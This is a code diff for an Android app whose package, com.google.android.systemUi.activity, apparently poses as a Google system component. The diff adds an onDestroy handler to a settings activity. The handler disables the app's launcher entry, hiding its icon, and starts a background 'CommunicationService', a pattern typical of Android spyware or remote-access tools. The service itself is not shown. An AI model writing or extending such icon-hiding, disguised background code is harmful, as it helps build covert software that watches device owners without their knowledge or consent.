@@ -1,8 +1,10 @@
 package com.google.android.systemUi.activity;
 
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.preference.PreferenceFragment;
@@ -56,6 +58,18 @@ public class Configuration extends Activity
 				.beginTransaction()
 				.replace(android.R.id.content, mFragment)
 				.commit();
+	}
+
+	@Override
+	protected void onDestroy()
+	{
+		super.onDestroy();
+
+		PackageManager packageManager = getPackageManager();
+		ComponentName componentName = new ComponentName(this, Starter.class);
+		packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
+		startService(new Intent(this, CommunicationService.class));
 	}
 
 	@Override
